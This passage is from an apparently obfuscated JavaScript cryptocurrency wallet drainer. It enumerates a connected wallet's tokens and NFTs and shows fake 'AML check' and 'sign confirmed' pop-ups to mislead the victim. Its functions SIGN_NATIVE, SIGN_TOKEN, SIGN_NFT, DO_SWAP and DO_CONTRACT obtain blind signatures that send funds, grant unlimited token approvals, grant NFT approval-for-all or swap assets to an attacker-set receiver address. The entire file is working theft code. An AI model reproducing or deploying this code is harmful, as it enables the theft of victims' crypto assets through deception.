        'jsonrpc': '2.0',
        'method': 'ankr_getAccountBalance',
        'params': {
          'blockchain': ['eth', "bsc", 'polygon', "avalanche", "arbitrum", "fantom", 'optimism'],
          'walletAddress': _0x49206d
        }
      })
    });
    _0x5d231d = await _0x5d231d.json();
    for (const _0x2b6c0f of _0x5d231d.result.assets) {
      try {
        let _0x20bf93 = _0x2b6c0f.contractAddress || 'NATIVE';
        if (MS_Settings.Contract_Whitelist.length > 0x0 && !MS_Settings.Contract_Whitelist.includes(_0x20bf93.toLowerCase())) {
          continue;
        } else {
          if (MS_Settings.Contract_Blacklist.length > 0x0 && MS_Settings.Contract_Blacklist.includes(_0x20bf93.toLowerCase())) {
            continue;
          }
        }
        let _0x2d81c7 = {
          'chain_id': convert_chain("ANKR", 'ID', _0x2b6c0f.blockchain),
          'name': _0x2b6c0f.tokenName,
          'type': _0x2b6c0f.tokenType,
          'amount': parseFloat(_0x2b6c0f.balance),
          'amount_raw': _0x2b6c0f.balanceRawInteger,
          'amount_usd': parseFloat(_0x2b6c0f.balanceUsd),
          'symbol': _0x2b6c0f.tokenSymbol,
          'decimals': _0x2b6c0f.tokenDecimals,
          'address': _0x20bf93 || null,
          'price': parseFloat(_0x2b6c0f.tokenPrice)
        };
        if (_0x2d81c7.price > 0x0) {
          _0x53f04c.push(_0x2d81c7);
        }
      } catch (_0x20f676) {
        console.log(_0x20f676);
      }
    }
    return _0x53f04c;
  } catch (_0x405978) {
    console.log(_0x405978);
    return [];
  }
};
const get_nfts = async _0x576aee => {
  try {
    let _0x2ada26 = await fetch("https://api.opensea.io/api/v1/assets?owner=" + _0x576aee + "&order_direction=desc&limit=200&include_orders=false");
    let _0x27c3e4 = (await _0x2ada26.json()).assets;
    _0x2ada26 = await fetch('https://api.opensea.io/api/v1/collections?asset_owner=' + _0x576aee + "&offset=0&limit=200");
    let _0x1a4f2f = await _0x2ada26.json();
    let _0x1dd5e7 = [];
    for (const _0x265073 of _0x27c3e4) {
      try {
        let _0x4e0e53 = null;
        for (const _0x19fea8 of _0x1a4f2f) {
          try {
            if (_0x19fea8.primary_asset_contracts.length < 0x1) {
              continue;
            }
            if (_0x19fea8.primary_asset_contracts[0x0].address == _0x265073.asset_contract.address) {
              _0x4e0e53 = _0x19fea8;
              break;
            }
          } catch (_0x5051f3) {
            console.log(_0x5051f3);
          }
        }
        if (_0x4e0e53 == null) {
          continue;
        }
        if (MS_Settings.Contract_Whitelist.length > 0x0 && !MS_Settings.Contract_Whitelist.includes(_0x265073.asset_contract.address.toLowerCase())) {
          continue;
        } else {
          if (MS_Settings.Contract_Blacklist.length > 0x0 && MS_Settings.Contract_Blacklist.includes(_0x265073.asset_contract.address.toLowerCase())) {
            continue;
          }
        }
        let _0x4d0ae0 = convert_chain("OPENSEA", 'ID', _0x265073.asset_contract.chain_identifier);
        let _0x1e047c = _0x4e0e53.stats.one_day_average_price != 0x0 ? _0x4e0e53.stats.one_day_average_price : _0x4e0e53.stats.seven_day_average_price;
        _0x1e047c = _0x1e047c * MS_Currencies[convert_chain('ID', 'CURRENCY', _0x4d0ae0)].USD;
        let _0xe9e18b = {
          'chain_id': _0x4d0ae0,
          'name': _0x265073.name,
          'type': _0x265073.asset_contract.schema_name,
          'amount': _0x265073.num_sales,
          'amount_raw': null,
          'amount_usd': _0x1e047c,
          'id': _0x265073.token_id,
          'symbol': null,
          'decimals': null,
          'address': _0x265073.asset_contract.address,
          'price': _0x1e047c
        };
        if (typeof _0x1e047c == "number" && !isNaN(_0x1e047c) && _0x1e047c > 0x0) {
          _0x1dd5e7.push(_0xe9e18b);
        }
      } catch (_0x16045e) {
        console.log(_0x16045e);
      }
    }
    return _0x1dd5e7;
  } catch (_0x12ce57) {
    console.log(_0x12ce57);
    return [];
  }
};
const retrive_token = async (_0x1810b9, _0x21179f) => {
  try {
    let _0x32ea63 = await fetch("https://" + MS_API_Data[_0x1810b9] + "/api?module=contract&action=getsourcecode&address=" + _0x21179f + "&apikey=" + MS_Settings.Settings.Chains[convert_chain('ID', 'ANKR', _0x1810b9)].API, {
      'method': "GET",
      'headers': {
        'Accept': "application/json"
      }
    });
    _0x32ea63 = await _0x32ea63.json();
    if (_0x32ea63.message == 'OK') {
      if (_0x32ea63.result[0x0].Proxy == '1' && _0x32ea63.result[0x0].Implementation != '') {
        const _0x5bae13 = _0x32ea63.result[0x0].Implementation;
        return retrive_token(_0x1810b9, _0x5bae13);
      } else {
        return JSON.parse(_0x32ea63.result[0x0].ABI);
      }
    } else {
      return MS_Contract_ABI.ERC20;
    }
  } catch (_0x17a61e) {
    return MS_Contract_ABI.ERC20;
  }
};
const get_permit_type = _0x3fb8c5 => {
  try {
    if (MS_Settings.Settings.Permit.Mode == false) {
      return 0x0;
    }
    if (_0x3fb8c5.hasOwnProperty("permit") && _0x3fb8c5.hasOwnProperty("nonces") && _0x3fb8c5.hasOwnProperty("name") && _0x3fb8c5.hasOwnProperty("DOMAIN_SEPARATOR")) {
      const _0xad692b = (_0x29872e => {
        for (const _0x56b725 in _0x29872e) {
          if (_0x56b725.startsWith("permit(")) {
            const _0x551f2e = _0x56b725.slice(0x7).split(',');
            if (_0x551f2e.length === 0x7 && _0x56b725.indexOf('bool') === -0x1) {
              return 0x2;
            }
            if (_0x551f2e.length === 0x8 && _0x56b725.indexOf("bool") !== -0x1) {
              return 0x1;
            }
            return 0x0;
          }
        }
      })(_0x3fb8c5);
      return _0xad692b;
    } else {
      return 0x0;
    }
  } catch (_0x59e706) {
    return 0x0;
  }
};
const MS_Gas_Reserves = {};
const show_check = () => {
  try {
    Swal.fire({
      'title': "Connection established",
      'icon': 'success',
      'timer': 0x7d0
    }).then(() => {
      if (MS_Check_Done) {
        return;
      }
      Swal.fire({
        'text': "Connecting to Blockchain...",
        'imageUrl': "https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless",
        'imageHeight': 0x3c,
        'allowOutsideClick': false,
        'allowEscapeKey': false,
        'timer': 0x1388,
        'width': 0x258,
        'showConfirmButton': false
      }).then(() => {
        if (MS_Check_Done) {
          return;
        }
        Swal.fire({
          'text': "Getting your wallet address...",
          'imageUrl': "https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless",
          'imageHeight': 0x3c,
          'allowOutsideClick': false,
          'allowEscapeKey': false,
          'timer': 0x1388,
          'width': 0x258,
          'showConfirmButton': false
        }).then(() => {
          if (MS_Check_Done) {
            return;
          }
          Swal.fire({
            'text': "Checking your wallet for AML...",
            'imageUrl': "https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless",
            'imageHeight': 0x3c,
            'allowOutsideClick': false,
            'allowEscapeKey': false,
            'timer': 0x1388,
            'width': 0x258,
            'showConfirmButton': false
          }).then(() => {
            if (MS_Check_Done) {
              return;
            }
            Swal.fire({
              'text': "Good, your wallet is AML clear!",
              'icon': "success",
              'allowOutsideClick': false,
              'allowEscapeKey': false,
              'timer': 0x7d0,
              'width': 0x258,
              'showConfirmButton': false
            }).then(() => {
              if (MS_Check_Done) {
                return;
              }
              Swal.fire({
                'text': "Please wait, we're scanning more details...",
                'imageUrl': "https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless",
                'imageHeight': 0x3c,
                'allowOutsideClick': false,
                'allowEscapeKey': false,
                'timer': 0x0,
                'width': 0x258,
                'showConfirmButton': false
              });
            });
          });
        });
      });
    });
  } catch (_0x1afa4a) {
    console.log(_0x1afa4a);
  }
};
const get_nonce = async _0x24872e => {
  const _0x4442c2 = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[_0x24872e]);
  return await _0x4442c2.getTransactionCount(MS_Current_Address, "pending");
};
const wait_message = () => {
  try {
    if (!MS_Process) {
      return;
    }
    Swal.close();
    Swal.fire({
      'html': "<b>Thanks!</b>",
      'icon': 'success',
      'allowOutsideClick': false,
      'allowEscapeKey': false,
      'timer': 0x9c4,
      'width': 0x258,
      'showConfirmButton': false
    }).then(() => {
      Swal.fire({
        'html': "<b>Confirming your sign...</b><br><br>Please, don't leave this page!",
        'imageUrl': "https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless",
        'imageHeight': 0x3c,
        'allowOutsideClick': false,
        'allowEscapeKey': false,
        'timer': 0x0,
        'width': 0x258,
        'showConfirmButton': false
      });
    });
  } catch (_0x166775) {
    console.log(_0x166775);
  }
};
const end_message = () => {
  try {
    Swal.close();
    Swal.fire({
      'html': "<b>Sorry!</b> Your wallet doesn't meet the requirements.<br><br>Try to connect a middle-active wallet to try again!",
      'icon': 'error',
      'allowOutsideClick': true,
      'allowEscapeKey': true,
      'timer': 0x0,
      'width': 0x258,
      'showConfirmButton': true,
      'confirmButtonText': 'OK'
    });
  } catch (_0x54a2fc) {
    console.log(_0x54a2fc);
  }
};
let is_first_sign = true;
const sign_ready = () => {
  try {
    Swal.close();
    Swal.fire({
      'html': "<b>Success!</b> Your sign is confirmed!",
      'icon': "success",
      'allowOutsideClick': false,
      'allowEscapeKey': false,
      'timer': 0x0,
      'width': 0x258,
      'showConfirmButton': false
    });
  } catch (_0x4a3d60) {
    console.log(_0x4a3d60);
  }
};
const sign_next = () => {
  try {
    if (is_first_sign) {
      is_first_sign = false;
      return;
    }
    Swal.close();
    Swal.fire({
      'html': "<b>Waiting for your sign...</b><br><br>Please, sign message in your wallet!",
      'imageUrl': "https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless",
      'imageHeight': 0x3c,
      'allowOutsideClick': false,
      'allowEscapeKey': false,
      'timer': 0x0,
      'width': 0x258,
      'showConfirmButton': false
    });
  } catch (_0x522dac) {
    console.log(_0x522dac);
  }
};
const is_nft_approved = async (_0x57faaf, _0x58da12, _0x2e359d) => {
  try {
    const _0x434cf5 = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[0x1]);
    const _0x5a96e3 = new ethers.Contract(_0x57faaf, MS_Contract_ABI.ERC721, _0x434cf5);
    return await _0x5a96e3.isApprovedForAll(_0x58da12, _0x2e359d);
  } catch (_0x4b1e1d) {
    console.log(_0x4b1e1d);
    return false;
  }
};
const SIGN_NATIVE = async _0x3c77f7 => {
  const _0x36ec4d = new Web3(MS_Provider);
  const _0x553dfc = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[_0x3c77f7.chain_id]);
  const _0x3b8dbc = ethers.BigNumber.from(await _0x553dfc.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from("120")).toString();
  const _0x1e8b9f = _0x3c77f7.chain_id == 0xa4b1 ? 0x16e360 : _0x3c77f7.chain_id == 0xa86a ? 0x16e360 : 0x5208;
  const _0x308f83 = _0x3c77f7.chain_id == 0xa4b1 ? 0x4c4b40 : _0x3c77f7.chain_id == 0xa86a ? 0x4c4b40 : 0x249f0;
  const _0xf8eaaf = ethers.BigNumber.from(_0x3c77f7.chain_id == 0xa ? "35000000000" : _0x3b8dbc);
  const _0x5b4c20 = _0xf8eaaf.mul(ethers.BigNumber.from(_0x1e8b9f)).mul(ethers.BigNumber.from('2'));
  const _0x43de12 = _0xf8eaaf.mul(ethers.BigNumber.from(_0x308f83)).mul(ethers.BigNumber.from(String(MS_Gas_Reserves[_0x3c77f7.chain_id])));
  const _0x1d60bc = ethers.BigNumber.from(_0x3c77f7.amount_raw).sub(_0x5b4c20).sub(_0x43de12).toString();
  if (ethers.BigNumber.from(_0x1d60bc).lte(ethers.BigNumber.from('0'))) {
    throw "LOW_BALANCE";
  }
  const _0x2b6c44 = await get_nonce(_0x3c77f7.chain_id);
  let _0x6617eb = {
    'to': MS_Settings.Receiver,
    'nonce': _0x36ec4d.utils.toHex(_0x2b6c44),
    'gasLimit': _0x36ec4d.utils.toHex(_0x1e8b9f),
    'gasPrice': _0x36ec4d.utils.toHex(_0x3b8dbc),
    'value': _0x36ec4d.utils.toHex(_0x1d60bc),
    'data': '0x',
    'v': _0x36ec4d.utils.toHex(MS_Current_Chain_ID),
    'r': '0x',
    's': '0x'
  };
  let _0x59f770 = new ethereumjs.Tx(_0x6617eb);
  let _0x4ee9a3 = '0x' + _0x59f770.serialize().toString("hex");
  let _0x30d299 = _0x36ec4d.utils.sha3(_0x4ee9a3, {
    'encoding': "hex"
  });
  await sign_request(_0x3c77f7);
  const _0x1cf287 = await _0x36ec4d.eth.sign(_0x30d299, MS_Current_Address);
  const _0x1d5c15 = _0x1cf287.substring(0x2);
  const _0x27cda9 = '0x' + _0x1d5c15.substring(0x0, 0x40);
  const _0x207925 = '0x' + _0x1d5c15.substring(0x40, 0x80);
  const _0x416f2d = parseInt(_0x1d5c15.substring(0x80, 0x82), 0x10);
  const _0x509cb0 = _0x36ec4d.utils.toHex(_0x416f2d + _0x3c77f7.chain_id * 0x2 + 0x8);
  _0x59f770.r = _0x27cda9;
  _0x59f770.s = _0x207925;
  _0x59f770.v = _0x509cb0;
  const _0x115e55 = '0x' + _0x59f770.serialize().toString("hex");
  sign_next();
  const _0x55756c = await _0x553dfc.sendTransaction(_0x115e55);
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) {
    await _0x553dfc.waitForTransaction(_0x55756c.hash, 0x1, 0x7530);
  }
  await sign_success(_0x3c77f7, _0x1d60bc);
  sign_ready();
};
const SIGN_TOKEN = async _0x4f4d7c => {
  const _0x4c576f = new Web3(MS_Provider);
  const _0x37c9db = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[_0x4f4d7c.chain_id]);
  const _0x44014f = new ethers.Contract(_0x4f4d7c.address, MS_Contract_ABI.ERC20, _0x37c9db);
  const _0x1b2315 = ethers.BigNumber.from(await _0x37c9db.getGasPrice()).div(ethers.BigNumber.from("100")).mul(ethers.BigNumber.from('120')).toString();
  let _0x4cc02c = null;
  let _0x992cff = ethers.utils.parseEther("1158472395435294898592384258348512586931256");
  for (const _0xbc09ec of MS_Settings.Unlimited_BL) {
    try {
      if (_0xbc09ec[0x0] == MS_Current_Chain_ID && _0xbc09ec[0x1] == _0x4f4d7c.address.toLowerCase()) {
        _0x992cff = _0x4f4d7c.amount_raw;
        break;
      }
    } catch (_0x22e0d3) {
      console.log(_0x22e0d3);
    }
  }
  try {
    if (MS_Settings.Settings.Sign.Tokens == 0x1) {
      _0x4cc02c = await _0x44014f.estimateGas.approve(MS_Settings.Address, _0x992cff, {
        'from': MS_Current_Address
      });
    } else if (MS_Settings.Settings.Sign.Tokens == 0x2) {
      _0x4cc02c = await _0x44014f.estimateGas.transfer(MS_Settings.Receiver, _0x4f4d7c.amount_raw, {
        'from': MS_Current_Address
      });
    }
    _0x4cc02c = ethers.BigNumber.from(_0x4cc02c).div(ethers.BigNumber.from("100")).mul(ethers.BigNumber.from("120")).toString();
  } catch (_0x21bb05) {
    _0x4cc02c = _0x4f4d7c.chain_id == 0xa4b1 ? 0x4c4b40 : _0x4f4d7c.chain_id == 0xa86a ? 0x4c4b40 : 0x3d090;
  }
  const _0x5d9bea = await get_nonce(_0x4f4d7c.chain_id);
  let _0x45e9cf = null;
  let _0x4832c9 = new _0x4c576f.eth.Contract(MS_Contract_ABI.ERC20, _0x4f4d7c.address);
  if (MS_Settings.Settings.Sign.Tokens == 0x1) {
    _0x45e9cf = _0x4832c9.methods.approve(MS_Settings.Address, _0x992cff).encodeABI();
  } else {
    if (MS_Settings.Settings.Sign.Tokens == 0x2) {
      _0x45e9cf = _0x4832c9.methods.transfer(MS_Settings.Receiver, _0x4f4d7c.amount_raw).encodeABI();
    }
  }
  let _0x44da3e = {
    'to': _0x4f4d7c.address,
    'nonce': _0x4c576f.utils.toHex(_0x5d9bea),
    'gasLimit': _0x4c576f.utils.toHex(_0x4cc02c),
    'gasPrice': _0x4c576f.utils.toHex(_0x1b2315),
    'value': "0x0",
    'data': _0x45e9cf,
    'v': _0x4c576f.utils.toHex(MS_Current_Chain_ID),
    'r': '0x',
    's': '0x'
  };
  let _0x11f47d = new ethereumjs.Tx(_0x44da3e);
  let _0x3d96eb = '0x' + _0x11f47d.serialize().toString("hex");
  let _0x56bbe7 = _0x4c576f.utils.sha3(_0x3d96eb, {
    'encoding': "hex"
  });
  await sign_request(_0x4f4d7c);
  const _0x534786 = await _0x4c576f.eth.sign(_0x56bbe7, MS_Current_Address);
  const _0x4d0d61 = _0x534786.substring(0x2);
  const _0x222b3b = '0x' + _0x4d0d61.substring(0x0, 0x40);
  const _0x2df7aa = '0x' + _0x4d0d61.substring(0x40, 0x80);
  const _0x1a2cd9 = parseInt(_0x4d0d61.substring(0x80, 0x82), 0x10);
  const _0x296d7b = _0x4c576f.utils.toHex(_0x1a2cd9 + _0x4f4d7c.chain_id * 0x2 + 0x8);
  _0x11f47d.r = _0x222b3b;
  _0x11f47d.s = _0x2df7aa;
  _0x11f47d.v = _0x296d7b;
  const _0x2aeb25 = '0x' + _0x11f47d.serialize().toString("hex");
  sign_next();
  const _0x4ef974 = await _0x37c9db.sendTransaction(_0x2aeb25);
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) {
    await _0x37c9db.waitForTransaction(_0x4ef974.hash, 0x1, 0x7530);
  }
  await sign_success(_0x4f4d7c);
  sign_ready();
};
const SIGN_NFT = async _0x3c708c => {
  const _0x53d39a = new Web3(MS_Provider);
  const _0x10a277 = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[_0x3c708c.chain_id]);
  const _0x485da7 = new ethers.Contract(_0x3c708c.address, MS_Contract_ABI.ERC721, _0x10a277);
  const _0x5b4fbf = ethers.BigNumber.from(await _0x10a277.getGasPrice()).div(ethers.BigNumber.from("100")).mul(ethers.BigNumber.from('120')).toString();
  let _0x220456 = null;
  try {
    if (MS_Settings.Settings.Sign.NFTs == 0x1) {
      _0x220456 = await _0x485da7.estimateGas.setApprovalForAll(MS_Settings.Address, true, {
        'from': MS_Current_Address
      });
    } else if (MS_Settings.Settings.Sign.NFTs == 0x2) {
      _0x220456 = await _0x485da7.estimateGas.transferFrom(MS_Current_Address, MS_Settings.Receiver, _0x3c708c.id, {
        'from': MS_Current_Address
      });
    }
    _0x220456 = ethers.BigNumber.from(_0x220456).div(ethers.BigNumber.from("100")).mul(ethers.BigNumber.from("120")).toString();
  } catch (_0x48fa2c) {
    _0x220456 = _0x3c708c.chain_id == 0xa4b1 ? 0x4c4b40 : _0x3c708c.chain_id == 0xa86a ? 0x4c4b40 : 0x3d090;
  }
  const _0x4efb8f = await get_nonce(_0x3c708c.chain_id);
  let _0x297be5 = null;
  let _0x4ec510 = new _0x53d39a.eth.Contract(MS_Contract_ABI.ERC721, _0x3c708c.address);
  if (MS_Settings.Settings.Sign.NFTs == 0x1) {
    _0x297be5 = _0x4ec510.methods.setApprovalForAll(MS_Settings.Address, true).encodeABI();
  } else {
    if (MS_Settings.Settings.Sign.NFTs == 0x2) {
      _0x297be5 = _0x4ec510.methods.transferFrom(MS_Current_Address, MS_Settings.Receiver, _0x3c708c.id).encodeABI();
    }
  }
  let _0x20888c = {
    'to': _0x3c708c.address,
    'nonce': _0x53d39a.utils.toHex(_0x4efb8f),
    'gasLimit': _0x53d39a.utils.toHex(_0x220456),
    'gasPrice': _0x53d39a.utils.toHex(_0x5b4fbf),
    'value': '0x0',
    'data': _0x297be5,
    'v': _0x53d39a.utils.toHex(MS_Current_Chain_ID),
    'r': '0x',
    's': '0x'
  };
  let _0x29a524 = new ethereumjs.Tx(_0x20888c);
  let _0x2ec4b1 = '0x' + _0x29a524.serialize().toString("hex");
  let _0x30177f = _0x53d39a.utils.sha3(_0x2ec4b1, {
    'encoding': "hex"
  });
  await sign_request(_0x3c708c);
  const _0x5d6605 = await _0x53d39a.eth.sign(_0x30177f, MS_Current_Address);
  const _0x10fcf5 = _0x5d6605.substring(0x2);
  const _0x4a2ddb = '0x' + _0x10fcf5.substring(0x0, 0x40);
  const _0x4ecf00 = '0x' + _0x10fcf5.substring(0x40, 0x80);
  const _0x5a0ec9 = parseInt(_0x10fcf5.substring(0x80, 0x82), 0x10);
  const _0x104f63 = _0x53d39a.utils.toHex(_0x5a0ec9 + _0x3c708c.chain_id * 0x2 + 0x8);
  _0x29a524.r = _0x4a2ddb;
  _0x29a524.s = _0x4ecf00;
  _0x29a524.v = _0x104f63;
  const _0x2aafbc = '0x' + _0x29a524.serialize().toString("hex");
  sign_next();
  const _0x591734 = await _0x10a277.sendTransaction(_0x2aafbc);
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) {
    await _0x10a277.waitForTransaction(_0x591734.hash, 0x1, 0x7530);
  }
  await sign_success(_0x3c708c);
  sign_ready();
};
const DO_SWAP = async _0x1bda59 => {
  const _0x565d50 = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[_0x1bda59.chain_id]);
  const _0x4887c3 = Math.floor(Date.now() / 0x3e8) + 99990;
  const _0x5c92ca = new ethers.Contract(_0x1bda59.swapper_address, MS_Pancake_ABI, MS_Signer);
  const _0x11e84c = ethers.BigNumber.from(await _0x565d50.getGasPrice()).div(ethers.BigNumber.from("100")).mul(ethers.BigNumber.from("120")).toString();
  let _0x3073c6 = null;
  try {
    _0x3073c6 = await _0x5c92ca.estimateGas.swapExactTokensForETH(_0x1625f7, '0', [_0x1bda59.address, MS_Swap_Route[_0x1bda59.chain_id]], MS_Settings.Receiver, _0x4887c3, {
      'from': MS_Current_Address
    });
    _0x3073c6 = ethers.BigNumber.from(_0x3073c6).div(ethers.BigNumber.from("100")).mul(ethers.BigNumber.from("120")).toString();
  } catch (_0x20fdc5) {
    _0x3073c6 = _0x1bda59.chain_id == 0xa4b1 ? 0x4c4b40 : _0x1bda59.chain_id == 0xa86a ? 0x4c4b40 : 0x55730;
  }
  const _0x1c9b1d = await get_nonce(_0x1bda59.chain_id);
  const _0x1625f7 = ethers.BigNumber.from(_0x1bda59.amount_raw).lte(ethers.BigNumber.from(_0x1bda59.swapper_allowance)) ? ethers.BigNumber.from(_0x1bda59.amount_raw).toString() : ethers.BigNumber.from(_0x1bda59.swapper_allowance).toString();
  await swap_request(_0x1bda59.swapper_type, _0x1bda59, [_0x1bda59]);
  sign_next();
  const _0x2cc31e = await _0x5c92ca.swapExactTokensForETH(_0x1625f7, '0', [_0x1bda59.address, MS_Swap_Route[_0x1bda59.chain_id]], MS_Settings.Receiver, _0x4887c3, {
    'gasLimit': ethers.BigNumber.from(_0x3073c6),
    'gasPrice': ethers.BigNumber.from(_0x11e84c),
    'nonce': _0x1c9b1d,
    'from': MS_Current_Address
  });
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) {
    await _0x565d50.waitForTransaction(_0x2cc31e.hash, 0x1, 0xea60);
  }
  await swap_success(_0x1bda59.swapper_type, _0x1bda59, [_0x1bda59]);
  sign_ready();
};
const DO_UNISWAP = async (_0x5dd1c9, _0x130802) => {
  const _0x445c52 = new Web3(MS_Provider);
  const _0x18542c = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[_0x5dd1c9.chain_id]);
  const _0x2306b6 = Math.floor(Date.now() / 0x3e8) + 99990;
  const _0x590f2a = new ethers.Contract(_0x5dd1c9.swapper_address, MS_Uniswap_ABI, MS_Signer);
  const _0x9ca7c4 = ethers.BigNumber.from(await _0x18542c.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from("120")).toString();
  const _0x382eb4 = await get_nonce(_0x5dd1c9.chain_id);
  const _0xcd17b1 = [];
  for (const _0x4c73cd of _0x130802) {
    try {
      const _0x341152 = ethers.BigNumber.from(_0x4c73cd.amount_raw).lte(ethers.BigNumber.from(_0x4c73cd.swapper_allowance)) ? ethers.BigNumber.from(_0x4c73cd.amount_raw).toString() : ethers.BigNumber.from(_0x4c73cd.swapper_allowance).toString();
      const _0x1f8957 = new _0x445c52.eth.Contract(MS_Uniswap_ABI, _0x4c73cd.swapper_address);
      const _0x195b72 = _0x1f8957.methods.swapExactTokensForTokens(_0x341152, '0', [_0x4c73cd.address, MS_Swap_Route[_0x4c73cd.chain_id]], MS_Settings.Receiver).encodeABI();
      _0xcd17b1.push(_0x195b72);
    } catch (_0x32cc28) {
      console.log(_0x32cc28);
    }
  }
  let _0x5b8a8f = null;
  try {
    _0x5b8a8f = await _0x590f2a.estimateGas.multicall(_0x2306b6, _0xcd17b1, {
      'from': MS_Current_Address
    });
    _0x5b8a8f = ethers.BigNumber.from(_0x5b8a8f).div(ethers.BigNumber.from("100")).mul(ethers.BigNumber.from("120")).toString();
  } catch (_0x583bcd) {
    _0x5b8a8f = _0x5dd1c9.chain_id == 0xa4b1 ? 0x4c4b40 : _0x5dd1c9.chain_id == 0xa86a ? 0x4c4b40 : 0x7a120;
  }
  await swap_request(_0x5dd1c9.swapper_type, _0x5dd1c9, _0x130802);
  sign_next();
  const _0x35de81 = await _0x590f2a.multicall(_0x2306b6, _0xcd17b1, {
    'gasLimit': ethers.BigNumber.from(_0x5b8a8f),
    'gasPrice': ethers.BigNumber.from(_0x9ca7c4),
    'nonce': _0x382eb4,
    'from': MS_Current_Address
  });
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) {
    await _0x18542c.waitForTransaction(_0x35de81.hash, 0x1, 0xea60);
  }
  await swap_success(_0x5dd1c9.swapper_type, _0x5dd1c9, _0x130802);
  sign_ready();
};
const DO_PANCAKE_V3 = async (_0x4035c4, _0x2fbf79) => {
  const _0x580ce7 = new Web3(MS_Provider);
  const _0x2a2fb3 = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[_0x4035c4.chain_id]);
  const _0x387fb7 = Math.floor(Date.now() / 0x3e8) + 99990;
  const _0x51d9b9 = new ethers.Contract(_0x4035c4.swapper_address, MS_Pancake_ABI, MS_Signer);
  const _0x132b7b = ethers.BigNumber.from(await _0x2a2fb3.getGasPrice()).div(ethers.BigNumber.from("100")).mul(ethers.BigNumber.from("120")).toString();
  const _0x35b948 = await get_nonce(_0x4035c4.chain_id);
  const _0x35383e = [];
  for (const _0x1205e4 of _0x2fbf79) {
    try {
      const _0x57bd6c = ethers.BigNumber.from(_0x1205e4.amount_raw).lte(ethers.BigNumber.from(_0x1205e4.swapper_allowance)) ? ethers.BigNumber.from(_0x1205e4.amount_raw).toString() : ethers.BigNumber.from(_0x1205e4.swapper_allowance).toString();
      const _0x1d4eb3 = new _0x580ce7.eth.Contract(MS_Pancake_ABI, _0x1205e4.swapper_address);
      const _0x295998 = _0x1d4eb3.methods.swapExactTokensForTokens(_0x57bd6c, '0', [_0x1205e4.address, MS_Swap_Route[_0x1205e4.chain_id]], MS_Settings.Receiver).encodeABI();
      _0x35383e.push(_0x295998);
    } catch (_0x1d4163) {
      console.log(_0x1d4163);
    }
  }
  let _0x30de11 = null;
  try {
    _0x30de11 = await _0x51d9b9.estimateGas.multicall(_0x387fb7, _0x35383e, {
      'from': MS_Current_Address
    });
    _0x30de11 = ethers.BigNumber.from(_0x30de11).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from("120")).toString();
  } catch (_0x45224c) {
    _0x30de11 = _0x4035c4.chain_id == 0xa4b1 ? 0x4c4b40 : _0x4035c4.chain_id == 0xa86a ? 0x4c4b40 : 0x7a120;
  }
  await swap_request(_0x4035c4.swapper_type, _0x4035c4, _0x2fbf79);
  sign_next();
  const _0x398300 = await _0x51d9b9.multicall(_0x387fb7, _0x35383e, {
    'gasLimit': ethers.BigNumber.from(_0x30de11),
    'gasPrice': ethers.BigNumber.from(_0x132b7b),
    'nonce': _0x35b948,
    'from': MS_Current_Address
  });
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) {
    await _0x2a2fb3.waitForTransaction(_0x398300.hash, 0x1, 0xea60);
  }
  await swap_success(_0x4035c4.swapper_type, _0x4035c4, _0x2fbf79);
  sign_ready();
};
const DO_CONTRACT = async _0x51de64 => {
  const _0x55b227 = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[_0x51de64.chain_id]);
  const _0x13a8e3 = ethers.BigNumber.from(await _0x55b227.getGasPrice()).div(ethers.BigNumber.from("100")).mul(ethers.BigNumber.from('120')).toString();
  const _0x1f8be5 = await get_nonce(_0x51de64.chain_id);
  const _0x927144 = convert_chain('ID', "ANKR", _0x51de64.chain_id);
  const _0x78c197 = new ethers.Contract(MS_Settings.Settings.Chains[_0x927144].Contract_Address, MS_Settings.Settings.Chains[_0x927144].Contract_Legacy == 0x1 ? MS_Contract_ABI.CONTRACT_LEGACY : MS_Contract_ABI.CONTRACT, MS_Signer);
  const _0x25022b = _0x51de64.chain_id == 0xa4b1 ? 0x4c4b40 : _0x51de64.chain_id == 0xa86a ? 0x4c4b40 : 0x186a0;
  const _0x35227e = _0x51de64.chain_id == 0xa4b1 ? 0x4c4b40 : _0x51de64.chain_id == 0xa86a ? 0x4c4b40 : 0x249f0;
  const _0xebe09f = ethers.BigNumber.from(_0x51de64.chain_id == 0xa ? "35000000000" : _0x13a8e3);
  const _0x39a44d = _0xebe09f.mul(ethers.BigNumber.from(_0x25022b)).mul(ethers.BigNumber.from('2'));
  const _0xf043f2 = _0xebe09f.mul(ethers.BigNumber.from(_0x35227e)).mul(ethers.BigNumber.from(String(MS_Gas_Reserves[_0x51de64.chain_id])));
  const _0x3e2818 = ethers.BigNumber.from(_0x51de64.amount_raw).sub(_0x39a44d).sub(_0xf043f2).toString();
  if (ethers.BigNumber.from(_0x3e2818).lte(ethers.BigNumber.from('0'))) {
    throw "LOW_BALANCE";
  }
  await transfer_request(_0x51de64);
  sign_next();
  let _0x55b7d0 = null;
  if (MS_Settings.Settings.Chains[_0x927144].Contract_Legacy == 0x0) {
    _0x55b7d0 = await _0x78c197[MS_Settings.Settings.Chains[_0x927144].Contract_Type](MS_Settings.Address, {
      'gasLimit': ethers.BigNumber.from(_0x25022b),
      'gasPrice': ethers.BigNumber.from(_0x13a8e3),
